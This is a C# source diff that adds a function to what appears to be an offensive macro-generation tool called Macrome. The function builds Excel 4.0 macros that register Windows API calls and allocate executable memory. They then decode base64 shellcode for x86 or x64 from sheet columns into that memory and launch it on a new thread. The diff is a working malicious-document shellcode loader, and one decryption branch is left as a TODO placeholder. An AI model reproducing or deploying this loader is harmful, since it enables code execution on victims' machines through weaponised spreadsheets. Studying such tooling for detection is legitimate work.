@@ -380,5 +380,74 @@ namespace Macrome
 
             return macros;
         }
+        
+        public static List<String> GetBase64DecodePattern(List<string> preamble)
+        {
+            int offset;
+            if (preamble.Count == 0)
+            {
+                offset = 1;
+            }
+            else
+            {
+                offset = preamble.Count;
+            }
+
+
+            //These variables assume certain positions in generated macros
+            //Col 1 is our main logic
+            string registerImportsFunction = string.Format("R{0}C1", offset+1);     //A2
+            string allocateMemoryFunction  = string.Format("R{0}C1", offset+5);   //A6
+            string writeLoopFunction       = string.Format("R{0}C1", offset+12);  //A13
+            string defineFunctionsFunction = string.Format("R{0}C1", offset+26);  //A27
+            string actualStart             = string.Format("R{0}C1", offset + 30); //A31
+            //Col 2 is our x86 payload, terminated by END
+            string x86Payload = string.Format("R1C{0}", 2);
+            //Col 3 is our x64 payload, terminated by END
+            string x64Payload = string.Format("R1C{0}", 3);
+
+            List<string> macros = new List<string>()
+            {
+                string.Format("=GOTO({0})",actualStart),
+                "=REGISTER(\"kernel32\", \"VirtualAlloc\", \"JJJJJ\", \"valloc\", , 1, 9)",
+                "=REGISTER(\"crypt32\",\"CryptStringToBinaryA\",\"JCJJJNCC\",\"cryptString\",,1,9)",
+                "=REGISTER(\"shlwapi\",\"SHCreateThread\",\"JJCJJ\",\"shCreateThread\",,1,9)",
+                "=RETURN()",
+                "curAddr=1342439424", // Set our start address at 0x50000000
+                "targetAddr=0",
+                "=WHILE(targetAddr=0)",
+                "targetAddr=valloc(curAddr,10000000,12288,576)", // Allocate 10MB for shellcode
+                "curAddr=curAddr+262144", // Iterate every 0x40000 bytes
+                "=NEXT()",
+                "=RETURN(targetAddr)",
+                "=ARGUMENT(\"targetWriteAddr\",1)",
+                "=ARGUMENT(\"curWriteRef\",8)",
+                "=ARGUMENT(\"decryptKey\",2)",
+                "curLoopWriteAddr=targetWriteAddr",
+                "=WHILE(curWriteRef<>\"END\")",
+                "=IF(LEN(decryptKey)>0)",
+                "TODO-decryptionfunction",
+                "=ELSE()",
+                "=cryptString(curWriteRef,LEN(curWriteRef),1,curLoopWriteAddr,256,\"\",\"\")",
+                "=END.IF()",
+                "curLoopWriteAddr=curLoopWriteAddr+(3*LEN(curWriteRef)/4)",
+                "curWriteRef=ABSREF(\"R[1]C\",curWriteRef)",
+                "=NEXT()",
+                "=RETURN(curLoopWriteAddr-targetWriteAddr)",
+                string.Format("RegisterImports={0}", registerImportsFunction),
+                string.Format("AllocateMemory={0}", allocateMemoryFunction),
+                string.Format("WriteLoop={0}", writeLoopFunction),
+                "=RETURN()",
+                string.Format("={0}()", defineFunctionsFunction),
+                "=RegisterImports()",
+                "targetAddress=AllocateMemory()",
+                string.Format("=IF(ISNUMBER(SEARCH(\"32\",GET.WORKSPACE(1))),SET.NAME(\"payload\",{0}),SET.NAME(\"payload\",{1}))", x86Payload, x64Payload),
+                "bytesWritten=WriteLoop(targetAddress,payload,\"\")",
+                "=shCreateThread(targetAddress,\"\",0,0)",
+                "=HALT()"
+            };
+
+            return macros;
+        }
     }
 }
